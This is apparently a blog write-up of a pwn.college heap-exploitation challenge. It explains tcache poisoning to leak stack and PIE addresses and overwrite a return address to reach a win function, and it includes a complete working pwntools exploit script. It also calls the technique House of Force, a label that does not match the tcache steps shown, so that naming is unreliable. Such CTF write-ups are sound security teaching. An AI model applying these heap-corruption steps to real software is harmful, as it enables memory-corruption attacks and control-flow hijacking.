---
layout: post
title: (Dynamic Allocator Misuse) level 11
categories: pwn.college Dynamic-Allocator-Misuse
date: 2025-10-07 08:00:21 +0300
tags: pwn.college PIE ASLR heap house-of-force tecache metadata
---

## Information
- category: pwn


## Description 
> Leverage TCACHE exploits to gain control flow.

## Write-up

**Goal:** use a heap primitive (House of Force style) to leak a stack address and PIE base, then overwrite the saved return address to call `win`.

### Summary
Malloc a small chunk, free it, then abuse the allocator metadata to make subsequent `malloc` return pointers into stack frames. Use small `echo`/read primitives to leak stack/return addresses, compute PIE offsets, then overwrite the return address with the `win` address and trigger the function return.

### Steps

### 1. Leak a stack pointer
1. `malloc(32)` and then `free()` the chunk (call this index `0`).
2. For the same index `0`, call `echo(0, offset = 8)` — reading at offset `8` prints a pointer that lies on the stack.
   - This leaks a stack address you can use to calculate offsets to saved return addresses and other saved frames.

### 2. Force the allocator to return a stack pointer
1. Use the House of Force primitive to manipulate the top chunk size / allocation pointer so the next `malloc` returns an address on the stack (the address you leaked).
2. `malloc(...)` now returns a pointer that points into stack memory.

### 3. Leak the return address (bypass PIE)
1. With the stack-mapped `malloc`/index in hand, call `echo(0, 16)` — this prints the saved return address from the stack frame.
2. From that leaked return address you can compute the PIE base and recover absolute addresses for `win`.

### 4. Overwrite return address and trigger `ret2win`
1. Since you have an index that maps to the stack, write a payload that places:
   - `0x10` bytes of padding,
   - followed by `p64(win_addr)` (the absolute address of `win`).
2. Ensure you keep any required canary or saved frame values intact if present.
3. return from the function so execution jumps to `win` and you get the flag.

Example conceptual payload (adjust offsets and widths for target):
```text
[ padding (0x10) ]
[ saved rbp (if needed) ]
[ ret addr -> p64(win_addr) ]
```
<img src="/images/stuff/Shot-2025-10-07-145500.png" style="border-radius: 14px;">


## Exploit

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyheap_level11.1")
global p
p = elf.process()

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def scanf(idx,data):
    p.sendline(b"scanf")
    p.sendline(idx)
    p.sendline(data)

def echo(idx,offset):
    p.sendline(b"echo")
    p.sendline(idx)
    p.sendline(offset)

def quit():
    p.sendline(b"quit")

def exploit():
    malloc(b"0",b"32")
    free(b"0")

    echo(b"0",b"8")

    p.recvuntil(b"Data: ")
    stack = u64(p.recvline().strip().ljust(8,b"\x00")) + 6
    log.success(f"stack: {hex(stack)}") 

    malloc(b"0",b"32")
    malloc(b"1",b"32")

    free(b"1")
    free(b"0")

    scanf(b"0",p64(stack))

    malloc(b"0",b"32")
    malloc(b"0",b"32")

    echo(b"0",b"16")

    p.recvuntil(b"Data: ")
    win = u64(p.recvline().strip().ljust(8,b"\x00")) - 0x1a93 + 0x1500
    log.success(f"win : {hex(win)}") 

    payload = b"A"*0x10 + p64(win)

    scanf(b"0",payload)
    p.interactive()

def main():
    exploit()

if __name__ == "__main__":
    main()
```